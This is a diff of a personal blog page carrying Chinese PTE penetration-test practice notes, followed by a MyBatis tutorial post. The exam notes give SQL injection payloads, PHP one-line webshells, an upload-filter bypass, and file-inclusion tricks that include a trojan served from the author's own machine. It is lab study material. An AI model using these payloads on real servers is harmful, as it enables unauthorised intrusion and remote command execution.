@@ -164,6 +164,732 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-pte刷题笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/03/14/pte%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">pte刷题笔记</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2022/03/14/pte%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2022-03-13T16:19:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>总结：要记住的东西：<br>sql：<br>    group_concat()<br>    information_schema<br>    columns<br>    information_schema.columns底下的列名：table_schema,table_name,column_name<br>文件上传：<br>    一句话木马：<code> &lt;?php eval($_POST[&#39;a&#39;]);?&gt;</code>,变型<code> &lt;?php echo @system($_POST[&#39;a&#39;]);?&gt;</code><br>    研究自带的sqzr.php（之前考试都可以传)<br>    可能会检查文件内容的头，可以复制（也可以copy /b jpg.jpg+sqzr.php result.jpg<br>反序列化：<br>    尽量找能shell的题目，背下基础的构成以防万一（因为操作机环境没有php)<br>文件包含：<br>    伪协议（data，远程文件包含）<br>    双写绕过别忘了<br>referer和xff：<br>    X-Forwarded-For（拼写）</p>
+<p>周末抽时间刷了一下pte的基础题，确实挺基础的（说实话比学之前招生老师扔给我的例子简单多了）<br>一共五道题<br>1.sql注入<br>代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select * from Article where uuid &#x3D; &#39;983fd952-df4e-4b63-946f-f2e6bb0327d6&#39;</span><br><span class="line">&#x2F;&#x2F;simple check</span><br><span class="line"></span><br><span class="line">while(strstr($uuid,&#39;--&#39;))</span><br><span class="line">&#123;</span><br><span class="line">    $uuid &#x3D; str_replace(&#39;--&#39;,&#39;&#39;,$uuid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">while(strstr($uuid,&#39;#&#39;))</span><br><span class="line">&#123;</span><br><span class="line">    $uuid &#x3D; str_replace(&#39;#&#39;,&#39;&#39;,$uuid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>url是<code>http://10.1.11.12:34071/start/index.php?uuid=983fd952-df4e-4b63-946f-f2e6bb0327d6</code></p>
+<p>过滤了<code>--</code>和<code>#</code>，老师的做法是就不用注释了，但是这里还有<code>;%00</code>可以用</p>
+<p>1.<code>;%00</code>法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;uuid&#x3D;-1 &#39; union select 1,2,3,4,5,6;%00&#96;&#96;&#96;:发现回显是2和3</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;uuid&#x3D;-1 &#39; union select 1,group_concat(table_schema),group_concat(column_name),4,5,6 from information_schema.columns;%00&#96;&#96;&#96;和&#96;&#96;&#96;uuid&#x3D;-1 &#39; union select 1,group_concat(table_schema),group_concat(column_name),4,5,6 from information_schema.columns;%00&#96;&#96;&#96;拿到所有库名表名列名</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;uuid&#x3D;-1 &#39; union select 1,haha,3,4,5,6 from IS_KEY;%00&#96;&#96;&#96;拿到key</span><br><span class="line"></span><br><span class="line">2.不注释（用单引号闭合后面）</span><br><span class="line">&#96;&#96;&#96;uuid&#x3D;983fd952-df4e-4b63-946f-f2e6bb0327d6 &#39; union select 1,2,3,4,5,&#39;6&#96;&#96;&#96;只有6的时候可以，所以是六个参</span><br><span class="line"></span><br><span class="line">其余几乎一样</span><br><span class="line">&#96;&#96;&#96;uuid&#x3D;-1 &#39; union select 1,2,3,4,5,&#39;6&#96;&#96;&#96;:发现回显是2和3</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;uuid&#x3D;-1 &#39; union select 1,group_concat(table_schema),group_concat(column_name),4,5,6 from information_schema.columns where &#39;1&#39;&#x3D;&#39;1&#96;&#96;&#96;和&#96;&#96;&#96;uuid&#x3D;-1 &#39; union select 1,group_concat(table_schema),group_concat(column_name),4,5,6 from information_schema.columns where &#39;1&#39;&#x3D;&#39;1&#96;&#96;&#96;拿到所有库名表名列名</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;uuid&#x3D;-1 &#39; union select 1,haha,3,4,5,6 from IS_KEY where &#39;1&#39;&#x3D;&#39;1 &#96;&#96;&#96;拿到key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">文件上传：</span><br><span class="line">因为能shell，所以直接拿了代码：</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure>
+ <?php error_reporting(0); ?>
+<?php include("function.php"); ?>
+<html>
+<head>
+  <title></title>
+  <link rel="stylesheet" href="../css/bootstrap.css">
+  <link rel="stylesheet" href="../css/nav.css">
+  <meta charset="UTF-8">
+</head>
+
+<body>
+
+  <?php include '../header.php';?>
+
+  <div class="container mt-5 min-height main-body">
+
+
+<div class="row">
+   <div class="col-7 m-auto">
+            <div class="card-content white-text">
+              <?php
+
+<pre><code>          $files = @$_FILES[&quot;files&quot;];
+          
+          if (judge($files)) 
+&#123;
+              $fullpath = &#39;/&#39; . $files[&quot;name&quot;];
+              if (move_uploaded_file($files[&#39;tmp_name&#39;], $_SERVER[&quot;DOCUMENT_ROOT&quot;] . $fullpath)) &#123;
+                  echo &quot;&lt;a href=&#39;$fullpath&#39;&gt;图片上传成功&lt;/a&gt;&quot;;
+              &#125;
+          &#125;
+          elseif (!(judge($files))&amp;&amp;!empty($files)) &#123;
+$fullpath = &#39;&#39;;
+            echo &quot;图片上传失败！&quot;;
+          &#125;
+          
+
+          echo &#39;&lt;form method=POST enctype=&quot;multipart/form-data&quot; action=&quot;&quot;&gt;
+                  &lt;input type=&quot;file&quot; name=&quot;files&quot;&gt;
+                  &lt;input type=submit value=&quot;上传&quot; class=&quot;btn btn-warning&quot;&gt;&lt;/form&gt;&#39;;
+
+          ?&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;card-action&quot;&gt;
+          &lt;?php if($fullpath!= &#39;&#39;) &#123; echo &quot;文件有效，上传成功： &lt;a href=\&quot;$fullpath\&quot;&gt; 点我查看&lt;/a&gt;&quot;; &#125; ?&gt;
+        &lt;/div&gt;
+</code></pre>
+  </div>
+  </div>
+
+
+</div>
+<?php include '../footer.php';?>
+</body>
+</html>
+</html>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<?php
+    
+    //é»‘åå•éªŒè¯ï¼Œå¤§å°å†™ç»•è¿‡
+    function step1($files)
+    {
+        $filename = $files["name"];
+        $ext = substr($filename,strripos($filename,'.') + 1);
+        if ($ext != "php")
+        {
+            return true;
+        }
+        return false;
+    }
+
+<pre><code>//éªŒè¯MIMEå¤´ï¼Œä¿®æ”¹æ•°æ®åŒ…ç»•è¿‡
+function step2($files)
+&#123;
+
+    if($files[&#39;type&#39;] == &quot;image/gif&quot; || $files[&#39;type&#39;] == &quot;image/jpeg&quot; || $files[&#39;type&#39;] == &quot;image/png&quot; ) 
+    &#123;
+        return true;
+    &#125;
+    return false;
+&#125;
+
+//éªŒè¯æ–‡ä»¶å†…å®¹ï¼Œä¸èƒ½åŒ…å«evalç­‰æ•æ„Ÿå‡½æ•°åï¼Œä½¿ç”¨å…¶ä»–å†…å®¹ï¼Œæ–‡ä»¶è¯»å†™
+function step3($files)
+&#123;
+    $content = file_get_contents($files[&quot;tmp_name&quot;]);
+
+    if (strpos($content, &quot;eval&quot;) === false &amp;&amp; strpos($content, &quot;assert&quot;) === false )
+    &#123;
+        return true;
+    &#125;
+    return false;
+&#125;
+
+
+//éªŒè¯æ–‡ä»¶å¤´
+function step4($files)
+&#123;
+    $png_header = &quot;89504e47&quot;;
+    $jpg_header = &quot;ffd8FFE0&quot;;
+    $gif_header = &quot;47494638&quot;;
+
+    $header = bin2hex(file_get_contents ( $files[&quot;tmp_name&quot;] , 0 , NULL , 0 , 4 )); 
+
+    if (strcasecmp($header,$png_header) == 0 || strcasecmp($header,$jpg_header) == 0 || strcasecmp($header,$gif_header) == 0) 
+    &#123;
+        return true;
+    &#125;
+    return false;
+&#125;
+
+function judge($files)
+&#123;
+
+    if (step2($files) &amp;&amp; step3($files) &amp;&amp; step4($files))
+    &#123;
+        return true;
+    &#125;
+    return false;
+    
+&#125;
+</code></pre>
+<p>?&gt;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以看见验证了step2，step3，step4</span><br><span class="line">分别对应这type（可伪造），内部函数是否有eval（可以用echo system()替代），还检测了png，jpg，gif的文件头（也可以伪造）</span><br><span class="line"></span><br><span class="line">所以先传一个正经图片，然后加上一句话木马&#96;&#96;&#96;  &lt;?php echo @system($_POST[&#39;a&#39;]);?&gt;&#96;&#96;&#96;即可</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">反序列化：</span><br><span class="line">源码：</span><br></pre></td></tr></table></figure>
+<?php
+error_reporting(0);
+include "key4.php";
+$TEMP = "Whatever is worth doing is worth doing well.";
+$str = $_GET['str'];
+if (unserialize($str) === $TEMP)
+{
+    echo "$key4";
+}
+show_source(__FILE__);
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">非常简单的一道题，但唯一的问题是：考试的操作机环境没有php</span><br><span class="line">解决方法是利用上面的文件上传shell之后，写入代码（echo &quot;……&quot; &gt;&gt; 1.php）</span><br></pre></td></tr></table></figure>
+<?php
+$TEMP = "Whatever is worth doing is worth doing well.";
+echo serialize($TEMP);
+```
+```s:44:"Whatever is worth doing is worth doing well.";```
+
+
+文件包含：
+page=hello时，显示的是hello.txt的内容，提示在key.php里，所以要用伪协议（要复习）
+page=data://text/plan,<?php phpinfo();?>
+<p>发现data被过滤了<br>所以双写page=dadata://ta://text/plan,<?php phpinfo();?></p>
+<p>方法二：远程文件包含<br>监听随意端口：<br>python -m SimpleHTTPServer 8899</p>
+<p>然后访问自己的计算机的8899端口：复制一下本地桌面上木马的链接地址（木马的后缀为txt）<br>然后page=http://本地ip:8899/文件名（去掉.txt）</p>
+<p>referer和xff，cookie<br>签到题，唯一的问题是xff的拼写：X-Forwarded-For<br>然后傻乎乎的用题目的ip，用127.0.0.1，localhost，0.0.0.0</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/03/14/pte%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-MyBatis笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/02/27/MyBatis%E7%AC%94%E8%AE%B0/">MyBatis笔记</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2022/02/27/MyBatis%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2022-02-27T10:33:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-27</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>github：全球最大同性交友网站</p>
+<p>1.1 获得mybatis：<br>maven仓库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;org.mybatis&#x2F;mybatis --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.mybatis&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mybatis&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.5.9&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>
+<p>github：<br>中文文档：</p>
+<p>1.2 持久层<br>数据持久化<br>    持久化就是将程序的数据在持久状态和瞬时状态转化的过程<br>    内存：断电即失<br>    持久化：数据库（jdbc），io文件<br>为什么需要持久化？<br>    有一些对象，不能让他丢掉<br>    内存太贵了</p>
+<p>1.3 持久层<br>Dao层，Service层，Controller层<br>    完成持久化工作的代码块<br>    层是界限明显的</p>
+<p>1.4 为什么需要mybatis？<br>    帮助程序员将数据存入到数据库中<br>    方便<br>    传统的JDBC代码太复杂了，简化，框架，自动化<br>    不用Mybatis也可以，学了搭网站更容易上手</p>
+<p>之后 Spring SpringMVC SpringBoot</p>
+<p>2、第一个Mybatis程序：<br>思路：搭建环境–&gt;导入Mybatis–&gt;编写代码–&gt;测试</p>
+<p>2.1搭建环境<br>搭建数据库<br>新建项目<br>    1.新建一个普通的maven项目<br>    2.删除src目录<br>    3.导入maven依赖</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot;</span><br><span class="line">         xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--父工程--&gt;</span><br><span class="line">    &lt;groupId&gt;com.kuang&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;Mybatis-study&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;&#x2F;version&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;11&lt;&#x2F;maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;11&lt;&#x2F;maven.compiler.target&gt;</span><br><span class="line">    &lt;&#x2F;properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--导入依赖--&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;!--mysql驱动--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;5.1.49&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line">        &lt;!--mybatis--&gt;</span><br><span class="line">        &lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;org.mybatis&#x2F;mybatis --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.mybatis&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;mybatis&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.5.9&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!--junit--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;junit&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;junit&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.13.2&lt;&#x2F;version&gt;</span><br><span class="line">            &lt;scope&gt;test&lt;&#x2F;scope&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line">    &lt;&#x2F;dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;project&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2.2 创建模块<br>    编写mybatis的核心配置文件<br>在maven的src下的resources建立一个mybatis-config.xml文件,从官网上复制代码：（xml的内容不要加注释！！！）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE configuration</span><br><span class="line">        PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Config 3.0&#x2F;&#x2F;EN&quot;</span><br><span class="line">        &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-config.dtd&quot;&gt;</span><br><span class="line">&lt;!--configuration核心配置文件--&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;environments default&#x3D;&quot;development&quot;&gt;</span><br><span class="line">        &lt;environment id&#x3D;&quot;development&quot;&gt;</span><br><span class="line">            &lt;transactionManager type&#x3D;&quot;JDBC&quot;&#x2F;&gt;</span><br><span class="line">            &lt;dataSource type&#x3D;&quot;POOLED&quot;&gt;</span><br><span class="line">                &lt;property name&#x3D;&quot;driver&quot; value&#x3D;&quot;com.mysql.jdbc.Driver&quot;&#x2F;&gt;</span><br><span class="line">                &lt;property name&#x3D;&quot;url&quot; value&#x3D;&quot;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;mybatis?useSSL&#x3D;true&amp;characterEncoding&#x3D;UTF-8&amp;useUnicode&#x3D;true&amp;serverTimezone&#x3D;GMT&quot;&#x2F;&gt;</span><br><span class="line">                &lt;property name&#x3D;&quot;username&quot; value&#x3D;&quot;root&quot;&#x2F;&gt;</span><br><span class="line">                &lt;property name&#x3D;&quot;password&quot; value&#x3D;&quot;011125&quot;&#x2F;&gt;</span><br><span class="line">            &lt;&#x2F;dataSource&gt;</span><br><span class="line">        &lt;&#x2F;environment&gt;</span><br><span class="line">    &lt;&#x2F;environments&gt;</span><br><span class="line">    &lt;!--每一个Mapper.xml都需要在Mybatis核心配置文件中注册--&gt;</span><br><span class="line">    &lt;mappers&gt;</span><br><span class="line">        &lt;mapper resource&#x3D;&quot;com&#x2F;kuang&#x2F;dao&#x2F;UserMapper.xml&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;mappers&gt;</span><br><span class="line">&lt;&#x2F;configuration&gt;</span><br></pre></td></tr></table></figure>
+
+<pre><code>编写mybatis工具类
+</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.utils;</span><br><span class="line"></span><br><span class="line">import org.apache.ibatis.io.Resources;</span><br><span class="line">import org.apache.ibatis.session.SqlSession;</span><br><span class="line">import org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line">import org.apache.ibatis.session.SqlSessionFactoryBuilder;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;sqlSessionFactory --&gt;  sqlSession</span><br><span class="line">public class MybatisUtils &#123;</span><br><span class="line">    private static SqlSessionFactory sqlSessionFactory;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F;使用Mybatis，第一步：获取sqlSessionFactory对象</span><br><span class="line">            String resource &#x3D; &quot;mybatis-config.xml&quot;;</span><br><span class="line">            InputStream inputStream &#x3D; Resources.getResourceAsStream(resource);</span><br><span class="line">            SqlSessionFactory sqlSessionFactory &#x3D; new SqlSessionFactoryBuilder().build(inputStream);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;创建可以进行数据库操作的对象</span><br><span class="line">    public static SqlSession getSqlSession()&#123;</span><br><span class="line">        SqlSession sqlSession &#x3D; sqlSessionFactory.openSession();</span><br><span class="line">        return sqlSession;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.3 编写代码<br>    实体类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.pojo;</span><br><span class="line"></span><br><span class="line">public class User &#123;</span><br><span class="line">    private int id;</span><br><span class="line">    private String name;</span><br><span class="line">    private String pwd;</span><br><span class="line"></span><br><span class="line">    public User() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public User(int id, String name, String pwd) &#123;</span><br><span class="line">        this.id &#x3D; id;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">        this.pwd &#x3D; pwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getId() &#123;</span><br><span class="line">        return id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setId(int id) &#123;</span><br><span class="line">        this.id &#x3D; id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getPwd() &#123;</span><br><span class="line">        return pwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setPwd(String pwd) &#123;</span><br><span class="line">        this.pwd &#x3D; pwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;User&#123;&quot; +</span><br><span class="line">                &quot;id&#x3D;&quot; + id +</span><br><span class="line">                &quot;, name&#x3D;&#39;&quot; + name + &#39;\&#39;&#39; +</span><br><span class="line">                &quot;, pwd&#x3D;&#39;&quot; + pwd + &#39;\&#39;&#39; +</span><br><span class="line">                &#39;&#125;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>Dao接口
+    UserDao.java
+</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.dao;</span><br><span class="line"></span><br><span class="line">import com.kuang.pojo.User;</span><br><span class="line"></span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public interface UserDao &#123;</span><br><span class="line">    List&lt;User&gt; getUserList();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>接口实现类(由JDBC的UserDaoImpl转变为Mapper配置文件)
+    创建UserMapper.xml的文件（不要加注释！！！）
+</code></pre>
